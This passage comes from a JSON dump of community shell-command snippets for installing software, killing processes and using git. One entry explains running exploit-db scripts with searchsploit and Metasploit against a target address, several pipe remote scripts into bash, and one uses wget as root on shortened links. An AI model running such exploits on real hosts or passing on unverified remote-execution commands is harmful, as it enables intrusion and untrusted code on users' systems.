pip for Python 3.4:  sudo apt-get remove python-pip  To uninstall python3-pip for Python 3.4, for example to move to pip for Python 2.7:  sudo apt-get remove python3-pip  Source: http://developer.opto22.com/epicdev/python/#for-python-34\npython-pip\ncurl https://bootstrap.pypa.io/get-pip.py --output get-pip.py\n",
    "reg_date": "2021-10-11T22:06:49.000Z"
  },
  {
    "id": 2405,
    "keyword": null,
    "link": null,
    "title": " how to install pip in ubuntu",
    "description": "sudo apt install python3-pip\napt upgrade && apt update apt install python3 python3 -m pip install -U pip   # OR sudo apt install python3-pip python3 -m pip --version pip --version\n#First enter the following command to the terminal @pip3 --version # after that @if it doesnt give a result like pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8) # enter the following commands sudo apt install python3-pip sudo apt install python3-pip3 #Thats all #Ranuga D\nsudo apt-get update  sudo apt install python3-pip\nsudo apt update sudo apt install python2\npython-pip\n",
    "reg_date": "2021-10-11T22:06:49.000Z"
  },
  {
    "id": 2406,
    "keyword": null,
    "link": null,
    "title": " how to install pod",
    "description": "$ sudo gem install cocoapods \npod --version\n",
    "reg_date": "2021-10-11T22:06:49.000Z"
  },
  {
    "id": 2407,
    "keyword": null,
    "link": null,
    "title": " how to install postman in ubuntu",
    "description": "sudo snap install postman\nInstall Postman in Linux  Download Postman by running following command in your Linux system:  $ wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz  Extract the downloaded file by running the following command in /opt directory:  $ sudo tar -xvzf postman-linux-x64.tar.gz -C /opt  Finally, create a symbolic link running following command in terminal:  $ sudo ln -s /opt/Postman/Postman /usr/bin/postman   For Desktop icons:  [Desktop Entry] Encoding=UTF-8 Name=Postman Exec=postman Icon=/home/USERNAME/Postman/app/resources/app/assets/icon.png Terminal=false Type=Application Categories=Development;\n",
    "reg_date": "2021-10-11T22:06:50.000Z"
  },
  {
    "id": 2408,
    "keyword": null,
    "link": null,
    "title": " how to install postman on manjaro linux",
    "description": "sudo snap install postman\n",
    "reg_date": "2021-10-11T22:06:50.000Z"
  },
  {
    "id": 2409,
    "keyword": null,
    "link": null,
    "title": " how to install psql python in ubuntu",
    "description": "pip install psycopg2-binary\nsudo apt-get update -y  sudo apt-get install -y python3-psycopg2\n",
    "reg_date": "2021-10-11T22:06:50.000Z"
  },
  {
    "id": 2410,
    "keyword": null,
    "link": null,
    "title": " how to install pterodactyl panel",
    "description": "bash <(curl -s https://raw.githubusercontent.com/vilhelmprytz/pterodactyl-installer/master/install.sh)\n",
    "reg_date": "2021-10-11T22:06:50.000Z"
  },
  {
    "id": 2411,
    "keyword": null,
    "link": null,
    "title": " how to install putty on mac",
    "description": "brew install putty\n",
    "reg_date": "2021-10-11T22:06:50.000Z"
  },
  {
    "id": 2412,
    "keyword": null,
    "link": null,
    "title": " how to install pycharm from command line",
    "description": "$ sudo snap install pycharm-community --classic OR $ sudo snap install pycharm-professional --classic OR $ sudo snap install pycharm-educational --classic \n",
    "reg_date": "2021-10-11T22:06:50.000Z"
  },
  {
    "id": 2413,
    "keyword": null,
    "link": null,
    "title": " how to install pycharm on linux",
    "description": "sudo snap install pycharm-community --classic\ncd ~/Downloads Now extract the tar gz file using the tar command in this way:  tar -xzf pycharm-community-2020.1.1.tar.gz Now enter the extracted PyCharm folder:  cd pycharm-community-2020.1.1 Go to its bin folder:  cd bin You&rsquo;ll find a shell script here. Make sure that you have execute permission:  chmod u+x pycharm.sh Now run this shell script:  sh pycharm.sh\nsudo dnf install snapd\n",
    "reg_date": "2021-10-11T22:06:50.000Z"
  },
  {
    "id": 2414,
    "keyword": null,
    "link": null,
    "title": " how to install python on ubuntu pyenv",
    "description": "# You need these dependencies for pyenv to work. sudo apt-get update;  sudo apt-get install make build-essential libssl-dev zlib1g-dev \\ libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm \\ libncursesw5-dev xz-utils tk-dev libxml2-dev libxmlsec1-dev libffi-dev liblzma-dev # Runs a script that installs pyenv curl https://pyenv.run | bash # Exports the path through these lines into .bashrc echo 'export PYENV_ROOT=\"$HOME/.pyenv\"' >> ~/.bashrc  echo 'export PATH=\"$PYENV_ROOT/bin:$PATH\"' >> ~/.bashrc  echo 'eval \"$(pyenv init --path)\"' >> ~/.bashrc  echo 'eval \"$(pyenv init -)\"' >> ~/.bashrc  # Make the pyenv available without needing to close terminal exec $SHELL pyenv update which pyenv # You're ready to run!  pyenv install --list pyenv install 2.7.18 pyenv install 3.7.0 pyenv help global pyenv global 2.7.15 3.7.0  \nroot@ubuntu:~# apt install -y make build-essential libssl-dev zlib1g-dev \\ > libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev\\ > libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python-openssl\\ > git\n",
    "reg_date": "2021-10-11T22:06:51.000Z"
  },
  {
    "id": 2415,
    "keyword": null,
    "link": null,
    "title": " how to install pytorch in conda cpu",
    "description": "conda install -c pytorch pytorch-cpu\n",
    "reg_date": "2021-10-11T22:06:51.000Z"
  },
  {
    "id": 2416,
    "keyword": null,
    "link": null,
    "title": " how to install react router dom with typescript",
    "description": "npm install react-router-dom @types/react-router-dom  # Yarn yarn add react-router-dom @types/react-router-dom\n",
    "reg_date": "2021-10-11T22:06:51.000Z"
  },
  {
    "id": 2417,
    "keyword": null,
    "link": null,
    "title": " how to install react with typescript",
    "description": "npx create-react-app my-app --template typescript\nnpx create-react-app my-app --template typescript  # or yarn create react-app my-app --template typescript\nnpx create-react-app my-app --template typescript # or # yarn create react-app my-app --template typescriptCopy\ncreate-react-app app-name --scripts-version=react-scripts-ts\n",
    "reg_date": "2021-10-11T22:06:51.000Z"
  },
  {
    "id": 2418,
    "keyword": null,
    "link": null,
    "title": " how to install redis in ubuntu",
    "description": "sudo apt update sudo apt install redis-server  sudo nano /etc/redis/redis.conf  # change \"supervised no\" to \"supervised systemd\"  supervised systemd  sudo systemctl restart redis.service  sudo systemctl status redis  redis-cli  \nsudo apt update sudo apt install redis-server  sudo systemctl restart redis.service  sudo systemctl status redis  redis-cli\n# This explanation shows how to install the latest redis version on ubuntu  # add redis repository - as ubuntu normal repository holds an old version of redis sudo add-apt-repository ppa:redislabs/redis sudo apt-get update  # install redis sudo apt-get install redis-server  # set redis to auto-strat on boot sudo systemctl enable redis-server sudo systemctl daemon-reload \nsudo apt update sudo apt install redis-server #To check the status of redis server sudo systemctl status redis #To stop redis server sudo systemctl stop redis #To restart the redis server\"It's working!\" sudo systemctl restart redis.service #To enter redis cli redis-cli #Check redis is running 127.0.0.1:6379> ping PONG # These cmd running on redis cli -->  127.0.0.1:6379> set test \"It's working!\" OK get test \"It's working!\" #Configuring Redis Password >sudo nano /etc/redis/redis.conf Scroll to the SECURITY section and look for a commented directive that reads: # requirepass foobared Uncomment it by removing the #, and change foobared to a secure password. Login form redis cli 127.0.0.1:6379>auth your_redis_password\nwget http://download.redis.io/redis-stable.tar.gz tar xvzf redis-stable.tar.gz cd redis-stable make \n$ wget https://download.redis.io/releases/redis-6.2.3.tar.gz $ tar xzf redis-6.2.3.tar.gz $ cd redis-6.2.3 $ make\n",
    "reg_date": "2021-10-11T22:06:51.000Z"
  },
  {
    "id": 2419,
    "keyword": null,
    "link": null,
    "title": " how to install redis on linux debian 10",
    "description": "sudo apt update sudo apt install redis-server \n",
    "reg_date": "2021-10-11T22:06:51.000Z"
  },
  {
    "id": 2420,
    "keyword": null,
    "link": null,
    "title": " how to install ruby on ubuntu",
    "description": "sudo apt update && sudo apt install -y ruby-full && ruby --version\nsudo snap install ruby --classic\n",
    "reg_date": "2021-10-11T22:06:52.000Z"
  },
  {
    "id": 2421,
    "keyword": null,
    "link": null,
    "title": " how to install sdkman linux command line",
    "description": "$ curl -s \"https://get.sdkman.io\" | bash source \"$HOME/.sdkman/bin/sdkman-init.sh\"\n$ curl -s \"https://get.sdkman.io\" | bash\n",
    "reg_date": "2021-10-11T22:06:52.000Z"
  },
  {
    "id": 2422,
    "keyword": null,
    "link": null,
    "title": " how to install searchsploit in kali linux",
    "description": "Method 2021 Kali Linux Live:  how to install searchsploit in kali linux   Install kali@kali:~$ sudo apt update && sudo apt -y install exploitdb  Update kali@kali:~$ searchsploit -u kali@kali:~$ sudo apt update && sudo apt -y full-upgrade   Search exploit searchsploit -t pastehereexploittitle  Searc exploit path: searchsploit -p nameexploit  Run Exploit python 48506.py http://10.10.10.198:8080/  For Help searchsploit -h  Source https://www.exploit-db.com/searchsploit\nMethod 2021 Kali Linux Live:  download and run exploits from exploit-db  1- Download the file and copy it 2- Open folder> file system> /usr/share/metasploit-framework/modules/exploits 3- Then, paste it using this command 4- sudo cp /home/kali/Downloads/nameexploit.rb /usr/share/metasploit-framework/modules/exploits 5- finally, open in metasploit 6- $use exploitname.rb  Happy hacking\n",
    "reg_date": "2021-10-11T22:06:52.000Z"
  },
  {
    "id": 2423,
    "keyword": null,
    "link": null,
    "title": " how to install soapui on ubuntu",
    "description": "1- Download open source SOAPUI &ndash; https://www.soapui.org/downloads/latest-release.html 2- Select &ldquo;Linux Installer (64-bit)&rdquo; &ndash; Adjust accordingly. 3- Click on Download. 4- Once it is download, chmod 755 SoapUI-x64-5.2.1.sh 5- Then run it: ./SoapUI-x64-5.2.1.sh 6- A pop-up will open. Accept all the defaults and follow the wizard to get it installed. 7- It will be installed by default under: $HOME/SmartBear/SoapUI-5.2.1/bin/SoapUI-5.2.1 8- Select to open it at the end or double click the &ldquo;SoapUI 5.2.1.desktop&rdquo; icon at the Des\n",
    "reg_date": "2021-10-11T22:06:52.000Z"
  },
  {
    "id": 2424,
    "keyword": null,
    "link": null,
    "title": " how to install staruml on ubuntu 18.04",
    "description": "cd ~/Downloads wget http://staruml.io/download/releases/StarUML-3.0.1-x86_64.AppImage chmod +x StarUML-3.0.1-x86_64.AppImage ./StarUML-3.0.1-x86_64.AppImage \n",
    "reg_date": "2021-10-11T22:06:52.000Z"
  },
  {
    "id": 2425,
    "keyword": null,
    "link": null,
    "title": " how to install steam on ubuntu",
    "description": "$ sudo apt update $ sudo apt install steam $ steam\nsudo apt update && sudo apt install steam\nGo to the steam store page, and find any game YOU want to play. I'd sugest a free game like War thunder (just incase it doesn't work) Make sure you're signed in and have an account Press 'download' (or add to my library, and make sure it has the steam logo above to the right) Press 'No, i need to download steam' once you've clicked it Download the .deb file and launch it login and download all the games you want HAVE FUN! ____________________ If that does work sudo apt-get install steam download steam and then find it. Have fun  You can play Windows games on steam. Even if you're on linux. Go to settings (top left) and find 'steam play' and use the latest version of Proton. Let porton download then restart steam find a windows game and download it press 'install'  then to save hassle, go to 'Manage Downloads' and then click 'Play' button on the game (make sure it's NOT downloaded, but its currently downloading) then it'll re-download using Proton\nsudo add-apt-repository multiverse\n",
    "reg_date": "2021-10-11T22:06:52.000Z"
  },
  {
    "id": 2426,
    "keyword": null,
    "link": null,
    "title": " how to install sublime text on arch linux",
    "description": "curl -O https://download.sublimetext.com/sublimehq-pub.gpg && sudo pacman-key --add sublimehq-pub.gpg && sudo pacman-key --lsign-key 8A8F901A && rm sublimehq-pub.gpg echo -e \"\\n[sublime-text]\\nServer = https://download.sublimetext.com/arch/stable/x86_64\" | sudo tee -a /etc/pacman.conf sudo pacman -Syu sublime-text\n",
    "reg_date": "2021-10-11T22:06:52.000Z"
  },
  {
    "id": 2427,
    "keyword": null,
    "link": null,
    "title": " how to install tar.gz in ubuntu",
    "description": "Download the desired .tar.gz or (.tar.bz2) file Open Terminal Extract the .tar.gz or (.tar.bz2) file with the following commands tar xvzf PACKAGENAME.tar.gz tar xvjf PACKAGENAME.tar.bz2 Navigate to the extracted folder using cd command cd PACKAGENAME Now run the following command to install the tarball ./configure make sudo make install\ntar -xzvf filename.tar.gz\ntar -xzf archive-name.tar.gz cd archive-name ./configure make sudo make install \ntar xf [filename] \n",
    "reg_date": "2021-10-11T22:06:52.000Z"
  },
  {
    "id": 2428,
    "keyword": null,
    "link": null,
    "title": " how to install teamspeak server arch linux",
    "description": "sudo pacman -S teamspeak3-server Full guide at: https://www.vultr.com/docs/how-to-install-a-teamspeak-3-server-on-arch-linux\n",
    "reg_date": "2021-10-11T22:06:53.000Z"
  },
  {
    "id": 2429,
    "keyword": null,
    "link": null,
    "title": " how to install to mysql server in powershell",
    "description": "first install chocolatey open Powershell as administrator C:\\\\User\\hey> choco install mysql\n",
    "reg_date": "2021-10-11T22:06:53.000Z"
  },
  {
    "id": 2430,
    "keyword": null,
    "link": null,
    "title": " how to install tor browser in ubuntu",
    "description": "# Download tor browser launcher sudo add-apt-repository ppa:micahflee/ppa sudo apt update  sudo apt install torbrowser-launcher\nRun the following commands as a user with sudo permissions :  1.Add the Tor browser launcher PPA repository :  sudo add-apt-repository ppa:micahflee/ppa  2.Install the Tor browser launcher package:  sudo apt update  sudo apt install torbrowser-launcher  The Tor browser can be launched either from the command line  by typing torbrowser-launcher or by clicking on the Tor Browser  Launcher icon (Activities -> Tor Browser).  When you start the launcher for the first time, it will download the  Tor browser and all other dependencies.\n#install sudo add-apt-repository ppa:micahflee/ppa sudo apt update sudo apt install torbrowser-launcher  #launch browser  torbrowser-launcher\nsudo apt install torbrowser-launcher\n",
    "reg_date": "2021-10-11T22:06:53.000Z"
  },
  {
    "id": 2431,
    "keyword": null,
    "link": null,
    "title": " how to install traceroute",
    "description": "sudo apt-get install traceroute\n",
    "reg_date": "2021-10-11T22:06:53.000Z"
  },
  {
    "id": 2432,
    "keyword": null,
    "link": null,
    "title": " how to install vagrant on linux",
    "description": " 1) Installation with package manager:  # to install Vagrant on Debian, Ubuntu, Linux Mint:  sudo apt install vagrant  # On Fedora:  sudo dnf install vagrant  # On SUSE/openSUSE:  sudo zypper install vagrant    2) Installation with \".deb\" file:  # If the top solution is now working, download .deb file from   # the link below and install it  link: https://www.vagrantup.com/downloads  # And then install it with this command  sudo apt install ./DEB_File.deb\nsudo apt install ./vagrant_2.2.6_x86_64.deb\n",
    "reg_date": "2021-10-11T22:06:53.000Z"
  },
  {
    "id": 2433,
    "keyword": null,
    "link": null,
    "title": " how to install vlc in fedora",
    "description": "su - dnf install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm dnf install https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm dnf install vlc dnf install python-vlc (optional) \n    $> su -     #> dnf install https://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-$(rpm -E %fedora).noarch.rpm     #> dnf install https://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-$(rpm -E %fedora).noarch.rpm     #> dnf install vlc     #> dnf install python-vlc (optional) \n",
    "reg_date": "2021-10-11T22:06:53.000Z"
  },
  {
    "id": 2434,
    "keyword": null,
    "link": null,
    "title": " how to install vue router",
    "description": "npm install vue-router \n//Installing Vue Router npm install vue-router  //Implementation //main.js - Add below lines import VueRouter from 'vue-router';  Vue.use(VueRouter);  const router = new VueRouter({   routes,   mode: 'history' });  new Vue({   router,   render: h => h(App) }).$mount('#app')  //App.vue - Add below line in v-content /* <template>   <v-app>     <v-content>       <router-view></router-view>     </v-content>   </v-app> </template> */  //route.js - We need to craate file under src import linkName from './components/fileName.vue'; export const routes = [   {     path: '/',     component: linkName   } ]\nnpm install --save vue-router@next  # Install the latest version\nimport Vue from 'vue' import VueRouter from 'vue-router'  Vue.use(VueRouter) \ncd [project] npm install --save vue-router // install only on the project that we are in\nnpm install vue-router\n",
    "reg_date": "2021-10-11T22:06:53.000Z"
  },
  {
    "id": 2435,
    "keyword": null,
    "link": null,
    "title": " how to install wc factory",
    "description": "$ yarn global add symlink-dir $ yarn global add @wcfactory/cli $ yarn global add polymer-cli $ yarn global add lerna $ yarn global add web-component-analyzer $ yarn global add http-server  # create a new company, a series of factories linked by the owner $ mkdir my-company-name && cd my-company-name && wcf start # create a new factory after you've made the company $ wcf factory # add a new element to the factory-name that you produced in the previous step $ wcf element  $ cd {factoryName}/elements/new-name $ yarn start\n",
    "reg_date": "2021-10-11T22:06:53.000Z"
  },
  {
    "id": 2436,
    "keyword": null,
    "link": null,
    "title": " how to install whatsapp on manjaro linux",
    "description": "sudo snap install whatsdesk\n",
    "reg_date": "2021-10-11T22:06:54.000Z"
  },
  {
    "id": 2437,
    "keyword": null,
    "link": null,
    "title": " how to install wps office in ubuntu",
    "description": "Step 1: Download WPS office Linux edition https://www.linux.wps.com  cd Downloads sudo dpkg -i filename \"The filename begin by wps-office\"\n",
    "reg_date": "2021-10-11T22:06:54.000Z"
  },
  {
    "id": 2438,
    "keyword": null,
    "link": null,
    "title": " how to install xlswriter for pandas",
    "description": "pip install xlsxwriter  import pandas as pd writer = pd.ExcelWriter(<filepath>, engine='xlsxwriter')\n",
    "reg_date": "2021-10-11T22:06:54.000Z"
  },
  {
    "id": 2439,
    "keyword": null,
    "link": null,
    "title": " how to install yum in ubuntu",
    "description": "sudo apt-get update -y sudo apt-get install -y yum\n",
    "reg_date": "2021-10-11T22:06:54.000Z"
  },
  {
    "id": 2440,
    "keyword": null,
    "link": null,
    "title": " how to install yum on mac",
    "description": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\" \n",
    "reg_date": "2021-10-11T22:06:54.000Z"
  },
  {
    "id": 2441,
    "keyword": null,
    "link": null,
    "title": " how to install yup",
    "description": "npm install yup\n",
    "reg_date": "2021-10-11T22:06:54.000Z"
  },
  {
    "id": 2442,
    "keyword": null,
    "link": null,
    "title": " how to install zlib",
    "description": "sudo apt install zlib1g sudo apt-get install zlib1g-dev\n$ sudo apt install zlib1g \n",
    "reg_date": "2021-10-11T22:06:54.000Z"
  },
  {
    "id": 2443,
    "keyword": null,
    "link": null,
    "title": " how to isntall blender on linux",
    "description": "Run:  sudo apt install blender in the terminal\n",
    "reg_date": "2021-10-11T22:06:55.000Z"
  },
  {
    "id": 2444,
    "keyword": null,
    "link": null,
    "title": " how to isntall yarn",
    "description": "npm install --global yarn \n",
    "reg_date": "2021-10-11T22:06:55.000Z"
  },
  {
    "id": 2445,
    "keyword": null,
    "link": null,
    "title": " how to isntall yran in your system",
    "description": "npm install --global yarn \n",
    "reg_date": "2021-10-11T22:06:55.000Z"
  },
  {
    "id": 2446,
    "keyword": null,
    "link": null,
    "title": " how to iterate through a file linux",
    "description": "while read p; do   echo \"$p\" done < example.txt\n",
    "reg_date": "2021-10-11T22:06:55.000Z"
  },
  {
    "id": 2447,
    "keyword": null,
    "link": null,
    "title": " how to kill a  process on a port?",
    "description": "#To list any process listening to the port 8080: lsof -i:8080  #To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  #or more violently: kill -9 $(lsof -t -i:8080)\nnetstat -ano | findstr \"PORT_NUMBER\"  taskkill /PID PORT_NUMBER /f\n",
    "reg_date": "2021-10-11T22:06:55.000Z"
  },
  {
    "id": 2448,
    "keyword": null,
    "link": null,
    "title": " how to kill apache process in linux",
    "description": "sudo netstat -nap | grep :80 You&rsquo;ll see apache2 and there is 3&ndash;4 digit numbers before it, mine is 980 sudo kill [number]\n",
    "reg_date": "2021-10-11T22:06:55.000Z"
  },
  {
    "id": 2449,
    "keyword": null,
    "link": null,
    "title": " how to kill linux screen",
    "description": "screen -XS 20411 quit \npkill screen\n",
    "reg_date": "2021-10-11T22:06:55.000Z"
  },
  {
    "id": 2450,
    "keyword": null,
    "link": null,
    "title": " how to kill port in ubuntu",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \nsudo kill -9 `sudo lsof -t -i:9001`\nsudo kill -9 `sudo lsof -t -i:3002`\nsudo kill -9 `sudo lsof -t -i:{PORT_NUMBER}`\nfuser -n tcp -k 4000  \nsudo lsof -t -i:9001\n",
    "reg_date": "2021-10-11T22:06:56.000Z"
  },
  {
    "id": 2451,
    "keyword": null,
    "link": null,
    "title": " how to kill process in linux by name",
    "description": "ps -ef | grep 'myProcessName' | grep -v grep | awk '{print $2}' | xargs -r kill -9 \n###################################################### # How to Kill the supervisord process without the PID ###################################################### ps -ef | grep 'supervisord' | grep -v grep | awk '{print $2}' | xargs -r kill -9  \npkill firefox\n",
    "reg_date": "2021-10-11T22:06:56.000Z"
  },
  {
    "id": 2452,
    "keyword": null,
    "link": null,
    "title": " how to kill tasks using grep",
    "description": "kill -9 $(ps aux | grep KeyWordHere | awk '{print $2}')\n",
    "reg_date": "2021-10-11T22:06:56.000Z"
  },
  {
    "id": 2453,
    "keyword": null,
    "link": null,
    "title": " how to know my ros version",
    "description": "echo $ROS_DISTRO\n",
    "reg_date": "2021-10-11T22:06:56.000Z"
  },
  {
    "id": 2454,
    "keyword": null,
    "link": null,
    "title": " how to know namespace is present or not in kubernetes shell script",
    "description": "#!/bin/bash  namespaceStatus=$(kubectl get ns nightlybuild-test -o json | jq .status.phase -r) if [ $namespaceStatus == \"Active\" ] then     echo \"namespace is present\" else    echo \"namespace is not present\"\n# Create NS kubectl create namespace my-namespace # Select NS kubectl config set-context --current --namespace=my-namespace # Check current NS kubectl config view | grep namespace\n",
    "reg_date": "2021-10-11T22:06:57.000Z"
  },
  {
    "id": 2455,
    "keyword": null,
    "link": null,
    "title": " how to know on which port my mongodb server is running",
    "description": "sudo lsof -iTCP -sTCP:LISTEN | grep mongo\n",
    "reg_date": "2021-10-11T22:06:58.000Z"
  },
  {
    "id": 2456,
    "keyword": null,
    "link": null,
    "title": " how to know screen resolution linux",
    "description": "$ xrandr | fgrep '*' \n",
    "reg_date": "2021-10-11T22:06:58.000Z"
  },
  {
    "id": 2457,
    "keyword": null,
    "link": null,
    "title": " how to know the shell version in ubuntu",
    "description": "gnome-shell --version \n",
    "reg_date": "2021-10-11T22:06:58.000Z"
  },
  {
    "id": 2458,
    "keyword": null,
    "link": null,
    "title": " how to know version of heroku",
    "description": "heroku -v # to know ther version of heroku\n$ sudo snap install --classic heroku\n",
    "reg_date": "2021-10-11T22:06:58.000Z"
  },
  {
    "id": 2459,
    "keyword": null,
    "link": null,
    "title": " how to kwno if my mac has intel 32 or 64",
    "description": "#run on the terminal this command: getconf LONG_BIT  # response will be either 32 or 64\n",
    "reg_date": "2021-10-11T22:06:58.000Z"
  },
  {
    "id": 2460,
    "keyword": null,
    "link": null,
    "title": " how to list all gnome extensions",
    "description": "# Your locally installed gnome Shell extensions, i.e., these that are installed for your user only, can be listed with the commmand: ls ~/.local/share/gnome-shell/extensions/  # You can find out which extensions are enables by querying a dconf setting: gsettings get org.gnome.shell enabled-extensions  # System wide installed gnome-shell extensions are listed with the command ls /usr/share/gnome-shell/extensions/  \n",
    "reg_date": "2021-10-11T22:06:59.000Z"
  },
  {
    "id": 2461,
    "keyword": null,
    "link": null,
    "title": " how to list running processes in ubuntu",
    "description": "#run this command in terminal top\n",
    "reg_date": "2021-10-11T22:06:59.000Z"
  },
  {
    "id": 2462,
    "keyword": null,
    "link": null,
    "title": " how to listen to the process running in port 8080 and kill it",
    "description": "Steps to kill process running on port 8080 in Windows cmd/terminal,  #1 netstat -ano | findstr < Port Number > #2 taskkill /F /PID < Process Id >\n# shows information on Processes running on port 80 with PIDs $: sudo lsof -i tcp:80  $: sudo lsof -t -i tcp:80 | sudo xargs kill\n",
    "reg_date": "2021-10-11T22:06:59.000Z"
  },
  {
    "id": 2463,
    "keyword": null,
    "link": null,
    "title": " how to login to git from terminal",
    "description": "git config --global user.name \"your_username\" \ngit config --global user.email \"your_email_address@example.com\" \n",
    "reg_date": "2021-10-11T22:07:00.000Z"
  },
  {
    "id": 2464,
    "keyword": null,
    "link": null,
    "title": " how to logout of git in terminal",
    "description": "git config --global --unset-all \ngit config --global --unset user.name git config --global --unset user.email git config --global --unset credential.helper \n",
    "reg_date": "2021-10-11T22:07:00.000Z"
  },
  {
    "id": 2465,
    "keyword": null,
    "link": null,
    "title": " how to make a new branch git",
    "description": "// Example for creating a new branch named myNewBranch git checkout -b myNewBranch  // First Push git push --set-upstream origin myNewBranch\n//Create a New Branch git checkout -b [name_of_your_new_branch] //First Push git push --set-upstream origin [name_of_your_new_branch]\n$ git checkout -b [name_of_your_new_branch]\n# Create New Branch And Switch To It $ git checkout -b myBranchName\ngit checkout -b topic/newbranch\nHow to create a new branch in git   $ git checkout -b good  here good is new branch name the line 3 after executing we will go to that branch\n",
    "reg_date": "2021-10-11T22:07:00.000Z"
  },
  {
    "id": 2466,
    "keyword": null,
    "link": null,
    "title": " how to make a new folder in ubuntu",
    "description": "mkdir \n",
    "reg_date": "2021-10-11T22:07:01.000Z"
  },
  {
    "id": 2467,
    "keyword": null,
    "link": null,
    "title": " how to make git remember username and password",
    "description": "git config --global credential.helper store\n",
    "reg_date": "2021-10-11T22:07:01.000Z"
  },
  {
    "id": 2468,
    "keyword": null,
    "link": null,
    "title": " how to make new user linux termil",
    "description": "sudo useradd -m username  #set user password sudo passwd username  #add user to sudoers [DANGEROUS] usermod -aG sudo username\n",
    "reg_date": "2021-10-11T22:07:01.000Z"
  },
  {
    "id": 2469,
    "keyword": null,
    "link": null,
    "title": " how to make ubuntu automatic updates",
    "description": "sudo dpkg-reconfigure --priority=low unattended-upgrades\n",
    "reg_date": "2021-10-11T22:07:02.000Z"
  },
  {
    "id": 2470,
    "keyword": null,
    "link": null,
    "title": " how to manage icloud drive in terminal",
    "description": "~/Library/Mobile\\ Documents/com~apple~CloudDocs/\n",
    "reg_date": "2021-10-11T22:07:02.000Z"
  },
  {
    "id": 2471,
    "keyword": null,
    "link": null,
    "title": " how to mannually change date and time in linux",
    "description": "date -s \"19 APR 2012 11:14:00\" \n",
    "reg_date": "2021-10-11T22:07:02.000Z"
  },
  {
    "id": 2472,
    "keyword": null,
    "link": null,
    "title": " how to move master branch to main branch",
    "description": "# Step 1  # create main branch locally, taking the history from master git branch -m master main  # Step 2  # push the new local main branch to the remote repo (GitHub)  git push -u origin main  # Step 3 # switch the current HEAD to the main branch git symbolic-ref refs/remotes/origin/HEAD refs/remotes/origin/main  # Step 4 # change the default branch on GitHub to main # https://docs.github.com/en/github/administering-a-repository/setting-the-default-branch  # Step 5 # delete the master branch on the remote git push origin --delete master\n",
    "reg_date": "2021-10-11T22:07:02.000Z"
  },
  {
    "id": 2473,
    "keyword": null,
    "link": null,
    "title": " how to move unstaged changes to different branch",
    "description": "git stash git checkout -b new-branch git stash pop \ngit stash git checkout correct-branch git stash pop \n",
    "reg_date": "2021-10-11T22:07:03.000Z"
  },
  {
    "id": 2474,
    "keyword": null,
    "link": null,
    "title": " how to open bash profile",
    "description": "> touch ~/.bash_profile;  open ~/.bash_profile\n",
    "reg_date": "2021-10-11T22:07:03.000Z"
  },
  {
    "id": 2475,
    "keyword": null,
    "link": null,
    "title": " how to open directory from wsl",
    "description": "# This opens the current directory you are in explorer.exe . \n",
    "reg_date": "2021-10-11T22:07:03.000Z"
  },
  {
    "id": 2476,
    "keyword": null,
    "link": null,
    "title": " how to open epub file in ubuntu",
    "description": "sudo apt-get install fbreader\n",
    "reg_date": "2021-10-11T22:07:03.000Z"
  },
  {
    "id": 2477,
    "keyword": null,
    "link": null,
    "title": " how to open gedit using terminal",
    "description": "gedit <filename> & disown\n",
    "reg_date": "2021-10-11T22:07:04.000Z"
  },
  {
    "id": 2478,
    "keyword": null,
    "link": null,
    "title": " how to open matlab in ubuntu",
    "description": "cd /usr/local/MATLAB/R2020a/bin ./matlab\n# Download the installer via https://www.mathworks.com/downloads/web_downloads (You can possibly get a free version by registering with the email adress of your university) # Unzip the installer file using this command: (or right click -> extract here) unzip -X -K matlab_R2020a_glnxa64.zip -d matlab_2020a_installer # Open the matalab_2020a_installer folder and open a terminal # use your terminal as root  using the following command : (required to let MATLAB write in usr directory) sudo su # type your password then : sudo ./install # Be sure to create a symbolic link, so you can start it using \"matlab -desktop\", if you forgot this, you can create it manually by doing \"sudo ln -s /usr/local/MATLAB/R2020a/bin/matlab /usr/local/bin/matlab\" # Now the MATLAB Installer is on, sign in, follow the steps and choose the product that you need # src: https://www.mathworks.com/matlabcentral/answers/518584-how-do-i-install-on-ubuntu # Add a desktop entry sudo wget -qO /usr/share/icons/matlab.png goo.gl/NDyi9t  sudo wget -qO /usr/share/applications/matlab.desktop goo.gl/NaHXrn # src: https://linuxconfig.org/how-to-install-matlab-on-ubuntu-18-04-bionic-beaver-linux # Note: if no symbolic link was made, you can start matlab by doing cd /usr/local/MATLAB/R2020a/bin # And from here running ./matlab # If this gives a license error, you should do  ./activate_matlab.sh\n",
    "reg_date": "2021-10-11T22:07:04.000Z"
  },
  {
    "id": 2479,
    "keyword": null,
    "link": null,
    "title": " how to open postgresql in mac",
    "description": "brew install postgresql\nbrew services start postgresqlpsql postgres\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n",
    "reg_date": "2021-10-11T22:07:04.000Z"
  },
  {
    "id": 2480,
    "keyword": null,
    "link": null,
    "title": " how to open xampp control panel in ubuntu",
    "description": "If you use a 64-bit system:  sudo /opt/lampp/manager-linux-x64.run\nsudo /opt/lampp/lampp start cd /opt/lampp/ ls sudo ./manager-linux-x64.run \n>>> cd /opt/lampp/  >>> ls   >>> sudo ./manager-linux-x64.run \n",
    "reg_date": "2021-10-11T22:07:05.000Z"
  },
  {
    "id": 2481,
    "keyword": null,
    "link": null,
    "title": " how to overwrite local repository with remote",
    "description": "git fetch origin git reset --hard origin/main\n",
    "reg_date": "2021-10-11T22:07:05.000Z"
  },
  {
    "id": 2482,
    "keyword": null,
    "link": null,
    "title": " how to overwrite symlink linux",
    "description": "ln -sfn /new/target /path/to/symlink\n",
    "reg_date": "2021-10-11T22:07:05.000Z"
  },
  {
    "id": 2483,
    "keyword": null,
    "link": null,
    "title": " how to partition hard drive linux stackoverflow",
